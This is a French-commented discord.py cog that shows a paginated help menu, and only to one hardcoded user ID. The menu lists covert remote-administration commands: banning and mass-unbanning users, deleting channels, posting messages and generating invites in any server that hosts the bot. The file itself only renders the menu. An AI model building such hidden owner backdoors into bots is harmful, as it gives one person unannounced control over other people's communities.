import discord
from discord.ext import commands

class AdminHelpCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

        # Catégories et commandes associées
        self.commands_list = {
            "🔍 Recherche & Informations": [
                "`rb!search <mot-clé/id>` → Cherche un serveur où le bot est présent.",
                "`rb!listservers` → Liste tous les serveurs où le bot est présent.",
                "`rb!ownerinfo <id>` → Infos sur le propriétaire d'un serveur.",
                "`rb!serverinfo <id>` → Infos sur un serveur distant.",
                "`rb!channelinfo <id_serveur> <id_salon>` → Infos sur un salon distant.",
                "`rb!rolelist <id>` → Voir tous les rôles d’un serveur."
            ],
            "⚙️ Administration à Distance": [
                "`rb!unban <id_serveur> <id_utilisateur>` → Débannir un utilisateur.",
                "`rb!ban <id_serveur> <id_utilisateur>` → Bannir un utilisateur.",
                "`rb!unbanall <id_serveur>` → Débannir tout le monde d’un serveur.",
                "`rb!checkbans <id_serveur>` → Voir la liste des bannis."
            ],
            "📢 Gestion des Messages": [
                "`rb!say <id_serveur> <id_salon> <message>` → Envoyer un message.",
                "`rb!geninvite <id_serveur>` → Générer une invitation vers un serveur."
            ],
            "📁 Gestion des Salons": [
                "`rb!createtext <id_serveur> <nom>` → Créer un salon texte.",
                "`rb!createvoice <id_serveur> <nom>` → Créer un salon vocal.",
                "`rb!deletechannel <id_serveur> <id_salon>` → Supprimer un salon.",
                "`rb!renamechannel <id_serveur> <id_salon> <nouveau_nom>` → Renommer un salon."
            ],
            "📊 Statistiques": [
                "`rb!bannedin` → Voir tous les serveurs où tu es banni.",
                "`rb!activeservers` → Voir les serveurs les plus actifs du bot."
            ]
        }

        # Pages d'aide (chaque page correspond à une catégorie)
        self.pages = list(self.commands_list.items())

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot:
            return
        if message.author.id != 1161709894685179985:
            return
        if message.content.lower().startswith("rb!help"):
            await self.send_help(message)

    async def send_help(self, message):
        """Envoie l'embed de la première page avec des boutons de navigation."""
        current_page = 0
        embed = self.get_embed(current_page)

        # Création des boutons
        view = HelpView(self, current_page)
        await message.channel.send(embed=embed, view=view)

    def get_embed(self, page_index):
        """Génère un embed pour une page spécifique."""
        category, commands = self.pages[page_index]
        embed = discord.Embed(
            title="📜 Liste des Commandes",
            description=f"**{category}**\n\n" + "\n".join(commands),
            color=discord.Color.blue()
        )
        embed.set_footer(text=f"Page {page_index+1}/{len(self.pages)}")
        return embed


class HelpView(discord.ui.View):
    """Classe pour gérer la pagination avec des boutons."""
    def __init__(self, cog, current_page):
        super().__init__()
        self.cog = cog
        self.current_page = current_page

    @discord.ui.button(label="⬅️", style=discord.ButtonStyle.primary, disabled=False)
    async def previous_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Bouton pour la page précédente."""
        self.current_page -= 1
        if self.current_page < 0:  # Revient à la dernière page si on est à la première
            self.current_page = len(self.cog.pages) - 1

        embed = self.cog.get_embed(self.current_page)
        await interaction.response.edit_message(embed=embed, view=self.update_buttons())

    @discord.ui.button(label="➡️", style=discord.ButtonStyle.primary)
    async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        """Bouton pour la page suivante."""
        self.current_page += 1
        if self.current_page >= len(self.cog.pages):  # Revient à la première page si on est à la dernière
            self.current_page = 0

        embed = self.cog.get_embed(self.current_page)
        await interaction.response.edit_message(embed=embed, view=self.update_buttons())

    def update_buttons(self):
        """Mise à jour de l'état des boutons."""
        new_view = HelpView(self.cog, self.current_page)
        return new_view


async def setup(bot):
    await bot.add_cog(AdminHelpCommand(bot))